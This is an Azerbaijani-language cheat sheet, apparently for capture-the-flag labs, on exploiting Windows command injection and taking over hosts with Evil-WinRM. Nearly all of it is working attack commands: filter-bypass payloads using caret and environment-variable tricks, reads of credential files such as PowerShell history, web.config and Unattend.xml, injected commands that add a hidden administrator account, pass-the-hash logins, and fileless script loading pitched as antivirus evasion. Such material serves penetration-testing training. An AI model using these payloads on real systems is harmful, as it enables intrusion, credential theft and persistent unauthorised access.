---

```markdown
# 🪟 Windows CMDI & Evil-WinRM Eksploytasiya Qeydləri

Bu sənəd Windows əməliyyat sistemlərində Command Injection (CMDI) zəifliklərini tapmaq, filtrləri keçmək, məlumat toplamaq və **Evil-WinRM** aləti vasitəsilə sistemə uzaqdan qoşulub tam idarəetməni ələ keçirmək üçün nəzərdə tutulmuşdur.

---

## 📌 1. Windows CMDI Əsasları və Operatorlar

Windows (CMD və PowerShell) mühitində əmrləri ardıcıl icra etmək üçün istifadə olunan əsas simvollar:

| Operator | Funksiyası | Nümunə Payload |
| :--- | :--- | :--- |
| `&` | Birinci əmri icra edir, sonra dərhal ikinciyə keçir. | `127.0.0.1 & whoami` |
| `&&` | İkinci əmri yalnız birinci əmr uğurla bitdikdə icra edir. | `127.0.0.1 && ipconfig` |
| `\|` | Birinci əmrin nəticəsini ikinci əmrə ötürür (Pipe). | `type flag.txt \| findstr "HBTN"` |
| `\|\|` | İkinci əmri yalnız birinci əmr uğursuz (xəta) olduqda icra edir. | `yanlis_emr \|\| net user` |

---

## 🛡️ 2. Windows-a Özəl Filtrlərdən Yan Keçmə (Bypass Tricks)

Əgər veb tətbiqdə müəyyən sözlər (`whoami`, `net`, `type`) və ya boşluq simvolu bloklanıbsa, Windows mühitində bu fəndlərdən istifadə et:

### A. Boşluq (Space) Filtrini Keçmək
Windows-da standart boşluq simvolu əvəzinə proqram daxili dəyişənlərdən istifadə etmək olar:
* `%PROGRAMFILES:~10,1%` -> Bu ifadə CMD-də avtomatik olaraq tək bir boşluq simvolu (` `) yaradır.
  ```cmd
  cat%PROGRAMFILES:~10,1%C:\Users\Public\flag.txt

```

### B. Obfuscation (Sözlərin Gizlədilməsi)

Windows CMD `^` (Escape) simvolunu əmrləri icra edərkən nəzərə almır və silir. Filtr isə sözü bütöv axtardığı üçün bloklaya bilmir.

* `w^h^o^a^m^i` -> Sistem tərəfindən `whoami` olaraq icra edilir.
* `n^e^t%PROGRAMFILES:~10,1%u^s^e^r` -> `net user` əmrini icra edir.

### C. Dəyişənlərin Parçalanması (Environment Variables)

Komandaları hissələrə bölüb dəyişən kimi təyin etmək:

```cmd
set A=who && set B=ami && %A%%B%

```

---

## 🔍 3. CMDI Vasitəsilə WinRM Girişi üçün Kəşfiyyat (Credential Hunting)

Evil-WinRM ilə sistemə daxil olmaq üçün bizə istifadəçi adı və şifrə (və ya NTLM heşi) lazımdır. CMDI-dən istifadə edərək sistemdəki həssas faylları oxuyun:

```cmd
# PowerShell Tarixçəsini Yoxlamaq (Şifrələr çox vaxt bura düşür)
type %userprofile%\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt

# Veb tətbiqin konfiqurasiya fayllarını oxumaq (Verilənlər bazası şifrələri üçün)
type C:\inetpub\wwwroot\web.config
type C:\xampp\htdocs\config.php

# Unattended quraşdırma fayllarında admin şifrələrini axtarmaq
type C:\Windows\Panther\Unattend.xml
type C:\Windows\Panther\Unattended.xml

```

---

## 🔑 4. CMDI Vasitəsilə Yeni WinRM İstifadəçisi Yaradılması

Əgər CMDI sorğunuz **Administrator** və ya **NT AUTHORITY\SYSTEM** səlahiyyətləri ilə işləyirsə, birbaşa özünüz üçün WinRM icazəsi olan yeni istifadəçi yarada bilərsiniz:

```cmd
# 1. İstifadəçi yarat (Adı: hbtn, Şifrə: Password123!)
127.0.0.1 & net user hbtn Password123! /add

# 2. İstifadəçini yerli idarəçilər qrupuna əlavə et
127.0.0.1 & net localgroup Administrators hbtn /add

# 3. MÜTLƏQ: İstifadəçini Uzaqdan İdarəetmə (WinRM) qrupuna əlavə et
127.0.0.1 & net localgroup "Remote Management Users" hbtn /add

```

---

## 🚀 5. Evil-WinRM Aləti Sənədləri (Master Guide)

Əgər əlində artıq etibarlı istifadəçi adı və şifrə/heş varsa və hədəf maşında WinRM portu (`5985` - HTTP və ya `5986` - HTTPS) açıqdırsa, Kali maşınından **Evil-WinRM** ilə tam qoşulma təmin et.

### A. Əsas Qoşulma Komandaları

```bash
# Plain-text şifrə ilə standart qoşulma (Port 5985)
evil-winrm -i <HƏDƏF_IP> -u hbtn -p 'Password123!'

# SSL/TLS üzərindən təhlükəsiz qoşulma (Port 5986)
evil-winrm -i <HƏDƏF_IP> -u hbtn -p 'Password123!' -S

# Şifrə olmadan Pass-the-Hash (PtH) metodu ilə NTLM Heşindən istifadə edərək qoşulma
evil-winrm -i <HƏDƏF_IP> -u Administrator -H "32196b56d6f2425e45c063103d17a7d3"

```

### B. Evil-WinRM Daxili Komandaları (Sessiya Daxilində)

Qoşulma uğurlu olduqdan sonra Evil-WinRM-in özünəməxsus qısayollarından istifadə edərək əməliyyatları sürətləndir:

* **Fayl Yükləmə (Upload):** Lokal Kali maşınındakı eksploiti və ya aləti (məsələn: `winPEAS.exe`) birbaşa hədəf maşına yükləyir.
```PowerShell
*evil-winrm* PS C:\> upload /path/to/local/winPEAS.exe C:\Users\Public\winPEAS.exe

```


* **Fayl Yükləyib Götürmə (Download):** Hədəf maşındakı flag və ya sənədi öz Kali maşınına çəkmək üçün.
```PowerShell
*evil-winrm* PS C:\> download C:\Users\Administrator\Desktop\flag.txt /home/kali/Desktop/

```


* **Servisləri Yoxlamaq (Services):** Sistemdəki aktiv servisləri siyahılamaq üçün sürətli komanda.
```PowerShell
*evil-winrm* PS C:\> services

```



### C. PowerShell Skriptlərini Yaddaşa Yükləmə (Bypass-4Keep)

Hədəf sistemdə diskin üzərinə fayl yazmadan (Fileless), birbaşa Kali maşınında olan PowerShell skriptlərini hədəfin RAM yaddaşına yükləyib işlədə bilərsən (AV/Windows Defender-dən yayınmaq üçün super metoddur):

```bash
# 1. Kali-də skriptlərin olduğu qovluğu göstərərək qoşulun
evil-winrm -i <HƏDƏF_IP> -u hbtn -p 'Password123!' -s '/usr/share/powershell-empire/modules/'

# 2. Evil-WinRM daxilində "menu" yazaraq yüklənə bilən skriptləri gör
*evil-winrm* PS C:\> menu

# 3. Skripti birbaşa yaddaşa çağır (Məsələn PowerUp.ps1)
*evil-winrm* PS C:\> Invoke-AllChecks

```

```
